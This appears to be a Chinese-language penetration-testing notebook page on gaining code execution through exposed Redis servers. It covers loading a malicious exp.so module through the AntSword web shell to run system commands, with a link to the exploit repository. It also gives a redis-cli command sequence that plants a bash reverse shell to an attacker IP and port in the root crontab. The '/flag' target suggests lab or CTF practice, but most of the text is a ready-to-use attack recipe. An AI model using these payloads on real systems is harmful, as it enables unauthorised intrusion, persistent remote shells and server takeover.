## Redis_RCE

如果发现主机有启动redis服务（此处目前只展示在内网）

![image-20240107222332870](F:\笔记\渗透\Redis攻击.assets\image-20240107222332870-17046374147791.png)



则可以先传exp.so到服务器上

```
Redis 中的 exp.so 文件通常被用作 Redis 提权的一种方式。这个文件是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。

Redis 模块是一种可插拔的扩展，它允许用户在 Redis 服务器中添加新的功能。exp.so 文件是一个 Redis 模块，它提供了一些命令和功能，可以让攻击者在 Redis 服务器中执行任意代码，从而获得服务器的控制权。

在 Redis 提权攻击中，攻击者通常会利用 Redis 的漏洞或者弱密码，获取 Redis 服务器的访问权限。一旦攻击者获得了访问权限，他们就可以上传 exp.so 文件到 Redis 服务器中，并使用 Redis 的 module load 命令加载这个文件。这个文件会在 Redis 服务器中执行任意代码，从而让攻击者获得服务器的控制权。
```



在使用蚁剑的Redis管理添加配置

![image-20240107222714029](F:\笔记\渗透\Redis攻击.assets\image-20240107222714029.png)



在redis虚拟命令行中执行以下命令加载，执行命令

```
MODULE LOAD /var/www/html/exp.so  //回显OK后

system.exec "ls /"
system.exec "cat /flag"
```

![image-20240107223517415](F:\笔记\渗透\Redis攻击.assets\image-20240107223517415.png)

[redis管理插件（蚁剑）]( https://github.com/Medicean/AS_Redis.git)

[恶意exp](https://github.com/Dliv3/redis-rogue-server.git)

## 定时任务

- Centos的定时任务文件在/var/spool/cron/

- Ubuntu定时任务文件在/var/spool/cron/crontabs/

  使用下列语句写一个反弹shell进定时任务

  ```
  redis-cli -h 192.168.244.128 -p 6379
  set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.244.129/7777 0>&1\n\n"
  config set dir /var/spool/cron/crontabs/
  config set dbfilename root
  save
  ```

过一段时间后，任务会自动执行

**注意**
这个方法只能Centos上使用，Ubuntu上行不通，原因如下：

- 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/var/spool/cron/权限644也能执行
- 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错